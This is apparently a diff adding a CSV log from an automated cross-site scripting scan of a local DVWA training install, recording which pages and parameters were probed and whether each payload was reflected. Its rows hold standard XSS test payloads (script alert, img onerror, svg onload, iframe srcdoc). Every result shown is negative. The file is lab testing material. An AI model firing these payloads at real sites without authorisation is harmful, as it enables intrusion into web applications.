@@ -1,0 +1,393 @@
+page_url,param_tested,method,payload,status,reflected,dom_rendered,stored_candidate_pages,evidence,baseline_len,response_len
+http://127.0.0.1/dvwa/,id,GET,<script>alert('XSS')</script>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/,id,GET,<body onload=alert('XSS')>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/includes/,id,GET,<script>alert('XSS')</script>,200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/,id,GET,<body onload=alert('XSS')>,200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/js/,id,GET,<script>alert('XSS')</script>,200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/,id,GET,<body onload=alert('XSS')>,200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/?C=S;O=A,id,GET,<script>alert('XSS')</script>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=S;O=A,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=S;O=A,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=S;O=A,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=S;O=A,id,GET,<body onload=alert('XSS')>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=S;O=A,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=S;O=A,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=S;O=A,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/images/,id,GET,<script>alert('XSS')</script>,200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/,id,GET,<body onload=alert('XSS')>,200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/css/,id,GET,<script>alert('XSS')</script>,200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/,id,GET,<body onload=alert('XSS')>,200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/?C=M;O=A,id,GET,<script>alert('XSS')</script>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=M;O=A,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=M;O=A,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=M;O=A,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=M;O=A,id,GET,<body onload=alert('XSS')>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=M;O=A,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=M;O=A,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=M;O=A,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=D;O=A,id,GET,<script>alert('XSS')</script>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=D;O=A,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=D;O=A,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=D;O=A,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=D;O=A,id,GET,<body onload=alert('XSS')>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=D;O=A,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=D;O=A,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=D;O=A,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1500,1500
+http://127.0.0.1/login.php,username,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
+http://127.0.0.1/login.php,password,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
+http://127.0.0.1/login.php,Login,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
+http://127.0.0.1/login.php,user_token,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
+http://127.0.0.1/login.php,username,POST,"""><script>console.log('XSS')</script>",200,False,False,,,1573,1573
+http://127.0.0.1/login.php,password,POST,"""><script>console.log('XSS')</script>",200,False,False,,,1573,1573
+http://127.0.0.1/login.php,Login,POST,"""><script>console.log('XSS')</script>",200,False,False,,,1573,1573
+http://127.0.0.1/login.php,user_token,POST,"""><script>console.log('XSS')</script>",200,False,False,,,1573,1573
+http://127.0.0.1/login.php,username,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
+http://127.0.0.1/login.php,password,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
+http://127.0.0.1/login.php,Login,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
+http://127.0.0.1/login.php,user_token,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
+http://127.0.0.1/login.php,username,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
+http://127.0.0.1/login.php,password,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
+http://127.0.0.1/login.php,Login,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
+http://127.0.0.1/login.php,user_token,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
+http://127.0.0.1/login.php,username,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
+http://127.0.0.1/login.php,password,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
+http://127.0.0.1/login.php,Login,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
+http://127.0.0.1/login.php,user_token,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
+http://127.0.0.1/login.php,username,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
+http://127.0.0.1/login.php,password,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
+http://127.0.0.1/login.php,Login,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
+http://127.0.0.1/login.php,user_token,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
+http://127.0.0.1/login.php,username,POST,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1573,1573
+http://127.0.0.1/login.php,password,POST,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1573,1573
+http://127.0.0.1/login.php,Login,POST,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1573,1573
+http://127.0.0.1/login.php,user_token,POST,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1573,1573
+http://127.0.0.1/login.php,username,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
+http://127.0.0.1/login.php,password,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
+http://127.0.0.1/login.php,Login,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
+http://127.0.0.1/login.php,user_token,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
+http://127.0.0.1/dvwa/?C=N;O=D,id,GET,<script>alert('XSS')</script>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=N;O=D,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=N;O=D,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=N;O=D,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=N;O=D,id,GET,<body onload=alert('XSS')>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=N;O=D,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=N;O=D,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=N;O=D,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/includes/?C=S;O=A,id,GET,<script>alert('XSS')</script>,200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=S;O=A,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=S;O=A,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=S;O=A,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=S;O=A,id,GET,<body onload=alert('XSS')>,200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=S;O=A,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=S;O=A,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=S;O=A,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=N;O=D,id,GET,<script>alert('XSS')</script>,200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=N;O=D,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=N;O=D,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=N;O=D,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=N;O=D,id,GET,<body onload=alert('XSS')>,200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=N;O=D,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=N;O=D,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=N;O=D,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/dvwaPage.inc.php,id,GET,<script>alert('XSS')</script>,200,False,False,,,45,45
+http://127.0.0.1/dvwa/includes/dvwaPage.inc.php,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,45,45
+http://127.0.0.1/dvwa/includes/dvwaPage.inc.php,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,45,45
+http://127.0.0.1/dvwa/includes/dvwaPage.inc.php,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,45,45
+http://127.0.0.1/dvwa/includes/dvwaPage.inc.php,id,GET,<body onload=alert('XSS')>,200,False,False,,,45,45
+http://127.0.0.1/dvwa/includes/dvwaPage.inc.php,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,45,45
+http://127.0.0.1/dvwa/includes/dvwaPage.inc.php,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,45,45
+http://127.0.0.1/dvwa/includes/dvwaPage.inc.php,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,45,45
+http://127.0.0.1/dvwa/includes/?C=M;O=A,id,GET,<script>alert('XSS')</script>,200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=M;O=A,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=M;O=A,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=M;O=A,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=M;O=A,id,GET,<body onload=alert('XSS')>,200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=M;O=A,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=M;O=A,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=M;O=A,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/dvwaPhpIds.inc.php,id,GET,<script>alert('XSS')</script>,200,False,False,,,,0
+http://127.0.0.1/dvwa/includes/dvwaPhpIds.inc.php,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,,0
+http://127.0.0.1/dvwa/includes/dvwaPhpIds.inc.php,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,,0
+http://127.0.0.1/dvwa/includes/dvwaPhpIds.inc.php,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,,0
+http://127.0.0.1/dvwa/includes/dvwaPhpIds.inc.php,id,GET,<body onload=alert('XSS')>,200,False,False,,,,0
+http://127.0.0.1/dvwa/includes/dvwaPhpIds.inc.php,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,,0
+http://127.0.0.1/dvwa/includes/dvwaPhpIds.inc.php,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,,0
+http://127.0.0.1/dvwa/includes/dvwaPhpIds.inc.php,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,,0
+http://127.0.0.1/dvwa/includes/?C=D;O=A,id,GET,<script>alert('XSS')</script>,200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=D;O=A,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=D;O=A,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=D;O=A,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=D;O=A,id,GET,<body onload=alert('XSS')>,200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=D;O=A,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=D;O=A,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/?C=D;O=A,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1377,1377
+http://127.0.0.1/dvwa/includes/DBMS/,id,GET,<script>alert('XSS')</script>,200,False,False,,,1174,1174
+http://127.0.0.1/dvwa/includes/DBMS/,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1174,1174
+http://127.0.0.1/dvwa/includes/DBMS/,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1174,1174
+http://127.0.0.1/dvwa/includes/DBMS/,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1174,1174
+http://127.0.0.1/dvwa/includes/DBMS/,id,GET,<body onload=alert('XSS')>,200,False,False,,,1174,1174
+http://127.0.0.1/dvwa/includes/DBMS/,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1174,1174
+http://127.0.0.1/dvwa/includes/DBMS/,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1174,1174
+http://127.0.0.1/dvwa/includes/DBMS/,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1174,1174
+http://127.0.0.1/dvwa/js/?C=S;O=A,id,GET,<script>alert('XSS')</script>,200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=S;O=A,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=S;O=A,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=S;O=A,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=S;O=A,id,GET,<body onload=alert('XSS')>,200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=S;O=A,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=S;O=A,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=S;O=A,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=D;O=A,id,GET,<script>alert('XSS')</script>,200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=D;O=A,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=D;O=A,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=D;O=A,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=D;O=A,id,GET,<body onload=alert('XSS')>,200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=D;O=A,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=D;O=A,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=D;O=A,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=M;O=A,id,GET,<script>alert('XSS')</script>,200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=M;O=A,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=M;O=A,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=M;O=A,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=M;O=A,id,GET,<body onload=alert('XSS')>,200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=M;O=A,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=M;O=A,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=M;O=A,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/dvwaPage.js,id,GET,<script>alert('XSS')</script>,200,False,False,,,1030,1030
+http://127.0.0.1/dvwa/js/dvwaPage.js,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1030,1030
+http://127.0.0.1/dvwa/js/dvwaPage.js,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1030,1030
+http://127.0.0.1/dvwa/js/dvwaPage.js,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1030,1030
+http://127.0.0.1/dvwa/js/dvwaPage.js,id,GET,<body onload=alert('XSS')>,200,False,False,,,1030,1030
+http://127.0.0.1/dvwa/js/dvwaPage.js,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1030,1030
+http://127.0.0.1/dvwa/js/dvwaPage.js,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1030,1030
+http://127.0.0.1/dvwa/js/dvwaPage.js,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1030,1030
+http://127.0.0.1/dvwa/js/?C=N;O=D,id,GET,<script>alert('XSS')</script>,200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=N;O=D,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=N;O=D,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=N;O=D,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=N;O=D,id,GET,<body onload=alert('XSS')>,200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=N;O=D,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=N;O=D,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/?C=N;O=D,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1173,1173
+http://127.0.0.1/dvwa/js/add_event_listeners.js,id,GET,<script>alert('XSS')</script>,200,False,False,,,593,593
+http://127.0.0.1/dvwa/js/add_event_listeners.js,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,593,593
+http://127.0.0.1/dvwa/js/add_event_listeners.js,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,593,593
+http://127.0.0.1/dvwa/js/add_event_listeners.js,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,593,593
+http://127.0.0.1/dvwa/js/add_event_listeners.js,id,GET,<body onload=alert('XSS')>,200,False,False,,,593,593
+http://127.0.0.1/dvwa/js/add_event_listeners.js,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,593,593
+http://127.0.0.1/dvwa/js/add_event_listeners.js,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,593,593
+http://127.0.0.1/dvwa/js/add_event_listeners.js,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,593,593
+http://127.0.0.1/dvwa/?C=S;O=D,id,GET,<script>alert('XSS')</script>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=S;O=D,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=S;O=D,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=S;O=D,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=S;O=D,id,GET,<body onload=alert('XSS')>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=S;O=D,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=S;O=D,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=S;O=D,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=N;O=A,id,GET,<script>alert('XSS')</script>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=N;O=A,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=N;O=A,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=N;O=A,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=N;O=A,id,GET,<body onload=alert('XSS')>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=N;O=A,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=N;O=A,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=N;O=A,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/images/lock.png,id,GET,<script>alert('XSS')</script>,200,False,False,,,731,731
+http://127.0.0.1/dvwa/images/lock.png,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,731,731
+http://127.0.0.1/dvwa/images/lock.png,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,731,731
+http://127.0.0.1/dvwa/images/lock.png,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,731,731
+http://127.0.0.1/dvwa/images/lock.png,id,GET,<body onload=alert('XSS')>,200,False,False,,,731,731
+http://127.0.0.1/dvwa/images/lock.png,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,731,731
+http://127.0.0.1/dvwa/images/lock.png,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,731,731
+http://127.0.0.1/dvwa/images/lock.png,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,731,731
+http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,<script>alert('XSS')</script>,200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,<body onload=alert('XSS')>,200,False,False,,,2167,2167
